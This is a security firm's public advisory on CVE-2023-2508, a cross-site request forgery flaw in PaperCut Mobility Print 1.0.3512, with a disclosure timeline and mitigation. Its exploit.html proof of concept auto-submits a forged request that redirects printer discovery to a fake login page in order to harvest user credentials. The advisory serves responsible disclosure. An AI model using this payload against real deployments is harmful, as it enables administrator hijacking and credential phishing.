[Contact us](/contact-us/)SearchEnglishEnglishEspaÃ±ol

* [![Fluid Attacks logo navbar](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/menu/Logo?_a=AXAJYUZ0.webp)](/)
ServicePlatform[Plans](/plans/)Resources[Advisories](/advisories/)Company[Log in](https://app.fluidattacks.com/)[Try for free](https://app.fluidattacks.com/SignUp)
# CSRF in PaperCut Mobility Print leads to sophisticated phishing

## Summary

|  |  |
| --- | --- |
| **Name** | CSRF in PaperCut Mobility Print leads to sophisticated phishing |
| **Code name** | [Solveig](https://es.wikipedia.org/wiki/Martin_Solveig) |
| **Product** | PaperCut Mobility Print |
| **Affected versions** | Version 1.0.3512 |
|
| **State** | Public |
| **Release date** | 2023-09-20 |

## Vulnerability

|  |  |
| --- | --- |
| **Kind** | Cross-site request forgery |
| **Rule** | [007. Cross-site request forgery](https://docs.fluidattacks.com/criteria/vulnerabilities/007) |
| **Remote** | Yes |
| **CVSSv3.1 Vector** | CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N |
| **CVSSv3.1 Base Score** | 5.3 |
| **Exploit available** | Yes |
| **CVE ID(s)** | [CVE-2023-2508](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2508) |

## Description

The `PaperCut Mobility Print` version 1.0.3512 application allows an
unauthenticated attacker to perform a CSRF attack on an instance
administrator to configure the clients host (in the "configure printer
discovery" section). This is possible because the application has no
protections against CSRF attacks, like Anti-CSRF tokens, header origin
validation, samesite cookies, etc.

## Vulnerability

This vulnerability occurs because the application has no protections
against CSRF attacks, like Anti-CSRF tokens, header origin validation,
samesite cookies, etc.

## Exploitation

In this scenario an unauthenticated attacker to perform a CSRF attack
on an instance administrator to configure the clients host (in the
"configure printer discovery" section).

Then, when the administrator wants to share the link to users so that
they can configure their credentials, they are actually sending users
to a malicious website that pretends to be the PaperCut NG login, with
the goal of exfiltrating the credentials.

### exploit.html

```
<!DOCTYPE html>
<html lang="en">
 <head>
 <meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
 </head>
 <body>
 <form action=http://vulnerable.com:9163/dns-config method=POST enctype=text/plain>
 <input type=hidden name={"mdnsEnabled":false,"searchDomain":"","subnets":[],"currentStep":"","dnsOptionSelected":"","dnsConfigModified":false,"ZoneIndex":0,"AccessibleIP":"","AccessibleHTTPSPort":0,"dnsFreeEnabled":true,"ExternalIPCIDRs":null,"serverAddresses":["192.168.1.8","Retr02332-MacBookPro.local"],"httpsPort":0,"dnsFreeDiscoveryHostname":"localhost:9999/login.html?redirect="," value=x":"x"} />
 </form>
 <script>document.forms[0].submit();</script>
 </body>
</html>

```
### Evidence of exploitation

## Our security policy

We have reserved the ID CVE-2023-2508 to refer to this issue from now on.

* <https://fluidattacks.com/advisories/policy/>

## System Information

* Version: PaperCut Mobility Print 1.0.3512
* Operating System: MacOS

## Mitigation

An updated version of PaperCut Mobility Print is available at the vendor page.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://www.papercut.com/>

**PaperCut Mobility Print server release history** <https://www.papercut.com/help/manuals/mobility-print/release-history/#mobility-print-server>

**PaperCut Mobility Print android app release history** <https://www.papercut.com/help/manuals/mobility-print/release-history/#mobility-print-android-app>

## Timeline

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-05-03

Vulnerability discovered.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-05-03

Vendor contacted.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-05-03

Vendor replied acknowledging the report.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-05-08

Vendor Confirmed the vulnerability.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-08-22

Vulnerability patched.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-09-20

Public Disclosure.

[![Fluid Logo Footer](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/fluid-attacks-logo-2022-light?_a=AXAJYUZ0.webp)](/)

Hacking software for over 20 years

Fluid Attacks tests applications and other systems, covering all software development stages. Our team assists clients in quickly identifying and managing vulnerabilities to reduce the risk of incidents and deploy secure technology.

Service

[Continuous Hacking](/services/continuous-hacking/)[Platform overview](/platform/)

Solutions

[Application security](/solutions/)[Compliance](/compliance/)[Systems](/systems/)

Testing Techniques

[ASPM](/product/aspm/)[SAST](/product/sast/)[DAST](/product/dast/)[MPT](/product/mpt/)[MAST](/product/mast/)[SCA](/product/sca/)[CSPM](/product/cspm/)[PTaaS](/product/ptaas/)[RE](/product/re/)[SCR](/solutions/secure-code-review/)

Plans

[Essential](/plans/#essential)[Advanced](/plans/)

Resources

[Blog](/blog/)[Learn](/learn/)[Advisories](/advisories/)[Clients](/clients/)[Downloadables](/resources/)[Documentation](https://docs.fluidattacks.com/)

Company

[About us](/about-us/)[Certifications](/certifications/)[Partners](/partners/)[Careers](/careers/)[Contact us](/contact-us/)[Ethics Hotline](https://r.easyllama.com/ed68576b-c349-4f40-926b-4905c82c53bb)

Copyright Â© 0 Fluid Attacks. We hack your software. All rights reserved.

[Service status](https://status.fluidattacks.com/)[Terms of use](/terms-use/)[Privacy policy](/privacy/)[Cookie policy](/cookie/)

